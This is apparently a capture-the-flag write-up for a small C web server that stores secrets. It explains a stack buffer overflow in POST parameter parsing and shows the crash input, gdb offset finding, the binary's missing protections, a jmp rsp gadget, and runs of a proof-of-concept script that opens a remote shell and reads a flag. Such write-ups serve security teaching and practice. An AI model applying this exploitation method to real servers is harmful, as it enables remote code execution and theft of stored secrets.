# FHM Maintenance

## Description

> Password-protected web storage for secrets in C.

The provided description says it well, it's a web storage to store a secret.
This service created by team *M.I.S.T* is a **very** light HTTP server, so
light that I may even say it's a server which communicate using a HTTP-like
format.

You can:
- Get a static page
- Register a user with his secret
- Retrieve a secret

The access to this different functions is done through the HTTP method and
the URL:

| Action      | Method | URL        |
| ----------: | :----: | :--------- |
| Static page | GET    | /extern/\* |
| Get secret  | GET    | /intern    |
| Save secret | POST   | _*_        |


No need to develop the static page aspect as it's a basic HTTP behaviour.
However, saving and retrieving a secret must follow a specific scheme.

To register a secret, you must then send a POST request with all three
parameters `username`, `pass` and `secret`. **Note: `secret` must
not to be the last parameter, see** [vulnerabilities](#vulnerabilities).

To retrieve your secret, you must send a GET request with a HTTP basic
authentication header. Otherwise, you'll be asked to authenticate. Of course,
the credentials are the ones of the secret you want to get.

If you like web interfaces, you can start with `/extern/index.html` to perform
these actions easily.


### Flag

Flag Description:

> Flags are identified by the username.

The *flag* is the secret stored by the user *flag_id*.

For the technical aspect of the storage of the flags, it's very simple. Every
`username`, `pass` and `secret` are stored in a file under the
`rw/doc_root/htpass/` directory. The name of the file is the *url-safe base64*
encoding of the *SHA1* hash of the `username`. And the content of this file is:
```
username:{SHA}base64_of_sha1_of_pass
secret
```


## Vulnerabilities

As introduced in [description](#description), there is a strange behaviour when
`secret` is the last parameter of a POST request. We can just look at
the function which extract POST parameters (`get_post_credentials`):

```asm
|       |   0x004026d6      be74434000     mov esi, str.secret_        ; "secret=" @ 0x404374
|       |   0x004026db      4889ef         mov rdi, rbp
|       |   0x004026de      e89de8ffff     call sym.imp.strstr         ;[5]
|       |   0x004026e3      4885c0         test rax, rax
|      ,==< 0x004026e6      7438           je 0x402720                 ;[6]
|      ||   0x004026e8      80780726       cmp byte [rax + 7], 0x26    ; [0x26:1]=0 ; '&'
|      ||   0x004026ec      488d7007       lea rsi, [rax + 7]          ; 0x7
|     ,===< 0x004026f0      0f847c000000   je 0x402772                 ;[7]
|     |||   0x004026f6      4889f2         mov rdx, rsi
|     |||   0x004026f9      0f1f80000000.  nop dword [rax]
|    .----> 0x00402700      4883c201       add rdx, 1
|    ||||   0x00402704      803a26         cmp byte [rdx], 0x26        ; [0x26:1]=0 ; '&'
|    `====< 0x00402707      75f7           jne 0x402700                ;[8]
|     |||   0x00402709      4829f2         sub rdx, rsi
|     |||   0x0040270c      4883c408       add rsp, 8
|     |||   0x00402710      488dbb000100.  lea rdi, [rbx + 0x100]      ; 0x100
|     |||   0x00402717      5b             pop rbx
|     |||   0x00402718      5d             pop rbp
|     ||`=< 0x00402719      e972e9ffff     jmp sym.imp.memcpy          ;[4]
```

So to find the end of the parameter, the program only scans for the first `&`
character:
```asm
|    .----> 0x00402700      4883c201       add rdx, 1
|    ||||   0x00402704      803a26         cmp byte [rdx], 0x26        ; [0x26:1]=0 ; '&'
|    `====< 0x00402707      75f7           jne 0x402700                ;[8]
```

Neither the length is checked nor the end of the string. For `username` and
`pass` the length isn't checked neither, but the null character is.

We may then be able to overflow a buffer, but we must first study this buffer:

```
0             0x80            0x100           0x180
+---------------+---------------+---------------+
| username      | password      | secret        |
+---------------+---------------+---------------+
```

This buffer is located on the stack, in the stack frame of `buildBody`
function. It's exactly at address `rsp + 0x30` and the function prolog is:
```asm
mov r15, rsi
mov esi, 2
push r14
push r13
push r12
mov r12, rdi
push rbp
push rbx
sub rsp, 0x1b8
```

We may definitely be able control the flow of execution easily but first let be
sure the vulnerability really exists:
``` bash
$ python -c 'print "POST /test HTTP/1.0\r\n\r\nusername=test_user&secret="+"A"*0x100+"&pass=test_user\r\n";' | ../ro/FHM-Maintenance 
Segmentation fault
```

Then to find the exact amount of data to override to reach the return address,
we can just use **gdb**. First we'll generate the data to send:
```bash
python -c 'print "POST /test HTTP/1.0\r\n\r\nusername=test_user&secret=" + "".join([chr(i) for i in range(48,256)]) + "&pass=test_user\r\n"' > find_stack_length
```

Then in **gdb** we just have to run the program and inspect the stack:
```
gdb$ run < find_stack_length

Program received signal SIGSEGV, Segmentation fault.

gdb$ x/4w $rsp
0x7fffffffe008: 0xebeae9e8  0xefeeedec  0xf3f2f1f0  0xf7f6f5f4
```

To override the return address we then must write `0xf0 - 0x30 = 0xc0` bytes.


## Proof of Concept

Now that we can control the stack, we can look at the possible exploitation
options:
```
pic      false
canary   false
nx       false
bintype  elf
class    ELF64
arch     x86
bits     64
os       linux
endian   little
static   false
```

The binary is then:
  - a 64 bits ELF (but we already knew that)
  - dynamically linked
  - not position-independant (PIC/PIE)
  - not using canaries (hopefully as we want to use buffer overflows)
  - using a executable stack

As the binary isn't PIE, we can use ROP, but we may not find lots of gadgets
because of the dynamic linker. However here is one of the available gadgets:
```
0x00000000004027d9 : jmp rsp ; ret
```

In addtion the stack is executable, so we can do anything we want: opening a
shell, retrieving a file or anything else. We just need to append the
modified return address with the shellcode we want. However, while usual
shellcode must not to include null bytes, here we just need to have no `&`
characters. But doing so isn't more complicated than avoiding null bytes.
(*Note:* `0x26` is not a valid opcode in amd64)

The [PoC script][poc] can use the two first payloads: opening a shell and 
getting the flag by retrieving a file:
```bash
poc.py shell <ip> <port>
poc.py retrieve <ip> <port> <flag_id>
```

It crafts the shellcode based on **pwntools** library, but it could have been
done manually.

```bash
$ ./poc.py retrieve 192.168.56.101 20111 3977506951
FLG6KjytBw8ql5pl
```

```bash
./poc.py shell 192.168.56.101 20111
$ ls doc_root/extern
done.html
images
index.html
register.html
style.css
$ exit
```


[poc]: poc.py
